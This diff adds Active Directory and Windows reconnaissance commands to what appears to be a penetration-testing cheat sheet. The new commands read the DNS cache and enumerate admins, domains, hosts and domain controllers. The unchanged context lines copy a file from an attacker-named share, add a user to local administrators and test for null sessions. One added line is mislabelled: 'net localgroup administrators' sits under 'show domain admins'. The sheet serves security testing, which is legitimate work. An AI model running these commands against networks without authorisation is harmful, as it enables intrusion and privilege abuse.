@@ -1332,6 +1332,14 @@ copy \\IP_attacker\share_name_here\file_name_here
 
 
 
+## IPCONFIG
+```powershell
+# read out local DNS cache
+ipconfig /displaydns
+```
+
+
+
 ## IPTABLES
 ```bash
 # set all counters to zero
@@ -1700,11 +1708,30 @@ net group "group_name_here" /add user_here
 # make user local admin
 net localgroup administrators /add user_here
 
+# show local admins
+net localgroup administrators
+
+# show domain admins
+net localgroup administrators
+net group "Domain Admins" /domain
+
 # display user information
 net user user_here /domain
 
 # enumerate shares
 net view IP_here
+
+# enumerate domains available to host
+net view /domain
+
+# list hosts in current domain
+net view
+
+# list hosts in some_other_domain
+net view /domain:some_other_domain_name_here
+
+# show domain controllers for current domain
+net group "Domain Controllers" /domain
 
 # test for null session on share
 net use \\IP_here\IPC$ '' /u:''
